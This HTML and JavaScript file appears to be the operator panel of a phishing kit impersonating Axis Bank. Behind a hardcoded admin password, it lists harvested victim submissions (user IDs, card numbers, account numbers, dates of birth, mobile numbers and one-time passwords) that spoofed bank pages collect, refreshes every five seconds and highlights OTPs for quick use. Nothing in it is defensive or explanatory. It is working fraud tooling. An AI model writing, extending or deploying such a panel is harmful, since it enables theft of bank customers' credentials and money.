<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Axis Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: #2c0b0e;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Password Login */
        .login-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #87103F;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .login-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 350px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        
        .login-title {
            color: white;
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
        }
        
        .login-input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 2px solid rgba(255, 255, 255, 0.5);
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
        }
        
        .login-input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background: white;
            color: #87103F;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .login-error {
            color: #ffcc00;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
        
        /* Admin Panel */
        .admin-panel {
            display: none;
            padding: 15px;
        }
        
        /* Header */
        .panel-header {
            background: #87103F;
            color: white;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 8px;
        }
        
        .header-title {
            font-size: 20px;
            font-weight: bold;
            text-align: center;
        }
        
        .refresh-info {
            text-align: center;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.8);
            margin-top: 5px;
        }
        
        .blink-dot {
            width: 8px;
            height: 8px;
            background: #00ff00;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
            animation: blink 5s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* Submissions List */
        .submissions-list {
            max-height: 85vh;
            overflow-y: auto;
            padding: 5px;
        }
        
        .submission-item {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 10px;
        }
        
        .submission-item.new {
            background: #87103F;
            border: 1px solid #ff4757;
            animation: highlight 5s infinite;
        }
        
        @keyframes highlight {
            0%, 100% { 
                background: #87103F;
                border-color: #ff4757;
            }
            50% { 
                background: #a0144a;
                border-color: #ff6b81;
            }
        }
        
        .submission-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            padding-bottom: 8px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .page-name {
            font-weight: bold;
            color: white;
            font-size: 14px;
        }
        
        .timestamp {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.7);
        }
        
        .submission-data {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.9);
        }
        
        .data-row {
            margin-bottom: 4px;
            word-break: break-all;
        }
        
        .data-label {
            color: rgba(255, 255, 255, 0.7);
            margin-right: 8px;
        }
        
        .data-value {
            color: white;
        }
        
        .data-value.otp {
            color: #ff4757;
            font-weight: bold;
        }
        
        .no-data {
            text-align: center;
            padding: 40px;
            color: rgba(255, 255, 255, 0.5);
            font-style: italic;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .admin-panel {
                padding: 10px;
            }
            
            .submission-header {
                flex-direction: column;
                gap: 4px;
            }
            
            .page-name, .timestamp {
                text-align: left;
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <!-- Password Login Screen -->
    <div class="login-screen" id="loginScreen">
        <div class="login-box">
            <div class="login-title">ADMIN PANEL</div>
            <input type="text" id="username" class="login-input" placeholder="User ID" autocomplete="off">
            <input type="password" id="password" class="login-input" placeholder="Password" autocomplete="off">
            <button class="login-btn" onclick="login()">ENTER</button>
            <div class="login-error" id="loginError">Invalid</div>
        </div>
    </div>
    
    <!-- Admin Panel -->
    <div class="admin-panel" id="adminPanel">
        <!-- Header -->
        <div class="panel-header">
            <div class="header-title">ðŸ“„ Submissions</div>
            <div class="refresh-info">
                <span class="blink-dot"></span>
                Auto-refresh: <span id="refreshTimer">5</span>s
            </div>
        </div>
        
        <!-- Submissions List -->
        <div class="submissions-list" id="submissionsList">
            <div class="no-data">No submissions</div>
        </div>
    </div>

    <script>
        // Admin Credentials
        const ADMIN_USER = "admin";
        const ADMIN_PASS = "18322387";
        
        let refreshInterval;
        let refreshTimer = 5;
        
        // Check login
        document.addEventListener('DOMContentLoaded', function() {
            const savedLogin = localStorage.getItem('axisAdminLoggedIn');
            if (savedLogin === 'true') {
                showAdminPanel();
            }
            
            // Enter key login
            document.getElementById('password').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') login();
            });
        });
        
        // Login function
        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username === ADMIN_USER && password === ADMIN_PASS) {
                localStorage.setItem('axisAdminLoggedIn', 'true');
                showAdminPanel();
            } else {
                const errorEl = document.getElementById('loginError');
                errorEl.style.display = 'block';
                setTimeout(() => errorEl.style.display = 'none', 3000);
            }
        }
        
        // Show admin panel
        function showAdminPanel() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            loadSubmissions();
            startAutoRefresh();
        }
        
        // Auto refresh every 5 seconds
        function startAutoRefresh() {
            clearInterval(refreshInterval);
            refreshInterval = setInterval(() => {
                refreshTimer--;
                document.getElementById('refreshTimer').textContent = refreshTimer;
                
                if (refreshTimer <= 0) {
                    loadSubmissions();
                    refreshTimer = 5;
                }
            }, 1000);
        }
        
        // Load submissions
        function loadSubmissions() {
            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
            displaySubmissions(submissions);
        }
        
        // Display submissions
        function displaySubmissions(submissions) {
            const container = document.getElementById('submissionsList');
            
            if (submissions.length === 0) {
                container.innerHTML = '<div class="no-data">No submissions</div>';
                return;
            }
            
            // Sort by timestamp (newest first)
            submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            let html = '';
            
            submissions.forEach((sub, index) => {
                const time = new Date(sub.timestamp);
                const timeString = time.toLocaleString();
                
                // Check if new (within 5 minutes)
                const isNew = (Date.now() - time.getTime()) < 5 * 60 * 1000;
                
                // Get page name
                const pageName = sub.page || 'Unknown';
                
                // Format data
                const dataHtml = formatSubmissionData(sub);
                
                html += `
                    <div class="submission-item ${isNew ? 'new' : ''}">
                        <div class="submission-header">
                            <div class="page-name">${pageName}</div>
                            <div class="timestamp">${timeString}</div>
                        </div>
                        <div class="submission-data">
                            ${dataHtml}
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // Format submission data
        function formatSubmissionData(sub) {
            let html = '';
            
            // Show action
            if (sub.action) {
                html += `<div class="data-row"><span class="data-label">Action:</span> <span class="data-value">${sub.action}</span></div>`;
            }
            
            // Show specific data based on page
            if (sub.page === 'index.html') {
                if (sub.userId) html += `<div class="data-row"><span class="data-label">User ID:</span> <span class="data-value">${sub.userId}</span></div>`;
                if (sub.visitorType) html += `<div class="data-row"><span class="data-label">Type:</span> <span class="data-value">${sub.visitorType}</span></div>`;
                if (sub.cardNumber) html += `<div class="data-row"><span class="data-label">Card:</span> <span class="data-value">${sub.cardNumber}</span></div>`;
            }
            else if (sub.page === 'axis_account.html') {
                if (sub.accountNo) html += `<div class="data-row"><span class="data-label">Account:</span> <span class="data-value">${sub.accountNo}</span></div>`;
                if (sub.dob) html += `<div class="data-row"><span class="data-label">DOB:</span> <span class="data-value">${sub.dob}</span></div>`;
            }
            else if (sub.page && sub.page.includes('otp')) {
                if (sub.otp) html += `<div class="data-row"><span class="data-label">OTP:</span> <span class="data-value otp">${sub.otp}</span></div>`;
                if (sub.mobileNumber) html += `<div class="data-row"><span class="data-label">Mobile:</span> <span class="data-value">${sub.mobileNumber}</span></div>`;
            }
            
            // Show other data
            for (const key in sub) {
                if (!['page', 'timestamp', 'action', 'userId', 'visitorType', 'cardNumber', 
                      'accountNo', 'dob', 'otp', 'mobileNumber'].includes(key)) {
                    if (sub[key] && typeof sub[key] === 'string' && sub[key].length > 0) {
                        html += `<div class="data-row"><span class="data-label">${key}:</span> <span class="data-value">${sub[key]}</span></div>`;
                    }
                }
            }
            
            return html || '<div class="data-row">No data</div>';
        }
        
        // Auto-logout after 30 minutes
        setTimeout(() => {
            localStorage.removeItem('axisAdminLoggedIn');
            location.reload();
        }, 30 * 60 * 1000);
    </script>
</body>
</html>
